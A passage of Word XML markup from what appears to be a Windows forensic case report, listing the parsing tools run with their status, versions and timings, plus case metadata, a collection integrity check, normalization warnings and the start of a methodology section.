            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>lecmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>LECmd - LNK files</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>LECmd latest (2026-10-19, net9); MFTECmd 2026.5.0.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>1 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>logfileparser</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>LogFileParser - $LogFile</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>LogFileParser v2.0.0.53</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>1607 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_boot</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>MFTECmd - $Boot</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0 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>MFTECmd - $MFT</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4 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_sds</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>MFTECmd - $Secure:$SDS</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0 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>MFTECmd - $UsnJrnl:$J</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6 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>PECmd - Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>PECmd latest (2026-10-19, net9); MFTECmd 2026.5.0.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>1 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>plaso_setupapi</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>plaso - setupapi.dev.log (USB)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>log2timeline plaso 20260720; psort plaso 20260720</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>6 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>rbcmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RBCmd - Recycle Bin ($I)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RBCmd latest (2026-10-19, net9); MFTECmd 2026.5.0.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>0 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_complement</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd - complementary batch (EMDMgmt, Active Setup, Print Monitors, BootExecute, PCA)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd latest (2026-10-19, net9); MFTECmd 2026.5.0.0; RECmd_ComplementBatch sha256 d65f8bcd7190b4d4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>6 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd - Kroll batch (all hives)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd latest (2026-10-19, net9); MFTECmd 2026.5.0.0; RECmd_KrollBatch latest (2026-10-19, net9); MFTECmd 2026.5.0.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>10 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>sbecmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SBECmd - ShellBags</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SBECmd latest (2026-10-19, net9); MFTECmd 2026.5.0.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>1 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>sidr</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SIDR - Windows Search index</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E36C09"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>warning</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>sidr v0.9.2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>sqlecmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SQLECmd - SQLite databases (browsers, notifications...)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SQLECmd latest (2026-10-19, net9); MFTECmd 2026.5.0.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>srumecmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SrumECmd - SRUM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SrumECmd latest (2026-10-19, net9); MFTECmd 2026.5.0.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>1 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>wxtcmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>WxTCmd - Windows Timeline</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>WxTCmd latest (2026-10-19, net9); MFTECmd 2026.5.0.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>1 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>zircolite</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Zircolite - Sigma detections</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>zircolite v4.6.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>11 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>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Analysis database</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>C:\Sleuthline\cases\test01\db\case.duckdb</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Pipeline version</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>commit 364268ea83a1; content sha256 B14AD179924B89A9; deployed 2026-10-19 16:59</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Collection integrity</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>INTACT: 1569 file(s) matching the SHA-1 recorded by KAPE, 0 different, 0 missing, 0 without KAPE hash, 1 expected difference(s) on files copied live in raw mode (checked on 2026-10-19T17:09:59+02:00)</w:t>
              <w:br/>
              <w:t>Expected differences (raw live copy: $MFT, $LogFile...): C:\$LogFile</w:t>
              <w:br/>
              <w:t>After parsing: no collection file modified by parsing</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Normalization</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>normalize.py v1.1 on 2026-10-19T15:37:20Z; mappings v2.0 (sha256 827ddb5b0a51a48f…)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Normalization warnings</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>logfileparser/LogFile_2026-10-19_17-10-20/LogFile_Mft_ObjectId_Entries.csv: 8 rows not matching the header re-read in lenient mode (extra values in columnNN columns, missing values set to NULL)</w:t>
              <w:br/>
              <w:t>Local time -&gt; UTC: ActiveTimeBias = 480 min (value at collection time; a daylight saving change during the period is not taken into account).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Normalization errors</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>none</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Outputs without a validated mapping</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>none</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.3 Methodology</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>The analysis follows the playbook below (PLAYBOOK.md), one step at a time. At each step, the agent queries the read-only database, correlates the sources and records a finding only if all its evidence references exist in the database (automatic check). Artifact dates are interpreted according to their evidential value (e.g. ShimCache = presence, Prefetch = execution).</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="737"/>
        <w:gridCol w:w="5102"/>
        <w:gridCol w:w="1417"/>
        <w:gridCol w:w="1247"/>
        <w:gridCol w:w="1134"/>
      </w:tblGrid>
      <w:tr>
        <w:trPr>
          <w:tblHeader w:val="true"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
